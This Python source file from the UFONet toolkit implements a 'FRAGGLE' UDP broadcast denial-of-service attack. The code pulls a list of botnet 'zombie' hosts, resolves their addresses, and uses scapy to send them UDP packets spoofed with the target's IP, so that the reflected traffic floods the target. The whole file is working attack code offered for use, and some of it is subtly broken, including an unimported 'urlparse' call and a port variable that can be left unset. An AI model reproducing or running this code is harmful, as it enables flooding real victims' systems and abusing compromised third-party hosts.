#!/usr/bin/env python3 
# -*- coding: utf-8 -*-"
"""
This file is part of the UFONet project, https://ufonet.03c8.net

Copyright (c) 2013/2020 | psy <epsylon@riseup.net>

You should have received a copy of the GNU General Public License along
with UFONet; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""
import sys, random, socket
import urllib.parse
try:
    from scapy.all import *
except:
    print("\nError importing: scapy lib. \n\n To install it on Debian based systems:\n\n $ 'sudo apt-get install python3-scapy'\n")
    sys.exit(2)

# UFONet UDP broadcast attack (FRAGGLE)
def randInt():
    x = random.randint(1,65535) # TCP ports
    return x

def sIP(base_stations): # extract 'base stations'
    bs = {}
    s_zombie = random.choice(base_stations).strip() # shuffle 'base stations'
    if not s_zombie in bs:
        url = urllib.parse.urlparse(s_zombie)
        try:
            s_zombie_ip = socket.gethostbyname(url.netloc)
            bs[s_zombie] = s_zombie_ip # add to dict of resolved domains
        except:
            try:
                import dns.resolver
                r = dns.resolver.Resolver()
                r.nameservers = ['8.8.8.8', '8.8.4.4'] # google DNS resolvers
                a = r.query(url.netloc, "A") # A record
                for rd in a:
                    s_zombie_ip = str(rd)
                bs[s_zombie] = s_zombie_ip # add to dict of resolved domains
            except:
                s_zombie_ip = s_zombie
    else:
        s_zombie_ip = bs.get(s_zombie)
    return s_zombie_ip

def fraggleize(ip, sport, rounds):
    f = open('botnet/zombies.txt') # use 'zombies' as 'base stations'
    base_stations = f.readlines()
    base_stations = [ base_station.replace('\n','') for base_station in base_stations ]
    f.close()
    n=0
    try:
        for x in range (0,int(rounds)):
            n=n+1
            s_zombie_ip = sIP(base_stations)
            if s_zombie_ip == None: # not any 'base stations' available
                print("[Error] [AI] [FRAGGLE] Imposible to retrieve 'base stations' -> [Aborting!]\n")
                break
            seq = randInt()
            window = randInt()
            IP_p = IP()
            try:
                IP_p.src = ip # UDP 'broadcast' package carring fraudulent (spoofed) source IP belonging to target (aka FRAGGLE attack)
            except:
                print("[Error] [AI] [FRAGGLE] Imposible to resolve IP from target! -> [Aborting!]\n")
                break
            try:
                IP_p.dst = s_zombie_ip
            except:
                print("[Error] [AI] [FRAGGLE] Imposible to resolve IP from 'base station' -> [Aborting!]\n")
                break
            try:
                send(IP_p/UDP(), verbose=0)
                print("[Info] [AI] [FRAGGLE] Redirecting 'base station' ["+str(n)+"] ["+str(s_zombie_ip)+"] -> [RE-FLUXING!]")
                time.sleep(1) # sleep time required for balanced sucess
            except:
                print("[Error] [AI] [FRAGGLE] Failed to redirect 'base station' ["+str(n)+"] ["+str(s_zombie_ip)+"]")
    except:
        print("[Error] [AI] [FRAGGLE] Failing to engage... -> Is still target online? -> [Checking!]")

class FRAGGLE(object):
    def attacking(self, target, rounds):
        print("[Info] [AI] UDP Broadcast (FRAGGLE) is redirecting: [" , rounds, "base stations ]")
        if target.startswith('http://'):
            target = target.replace('http://','')
            sport = 80
        elif target.startswith('https://'):
            target = target.replace('https://','')
            sport = 443
        try:
            ip = socket.gethostbyname(target)
        except:
            try:
                import dns.resolver
                r = dns.resolver.Resolver()
                r.nameservers = ['8.8.8.8', '8.8.4.4'] # google DNS resolvers
                url = urlparse(target)
                a = r.query(url.netloc, "A") # A record
                for rd in a:
                    ip = str(rd)
            except:
                ip = target
        if ip == "127.0.0.1" or ip == "localhost":
            print("[Info] [AI] [FRAGGLE] Sending message '1/0 %====D 2 Ur ;-0' to 'localhost' -> [OK!]\n")
            return
        fraggleize(ip, sport, rounds) # attack with FRAGGLE using threading
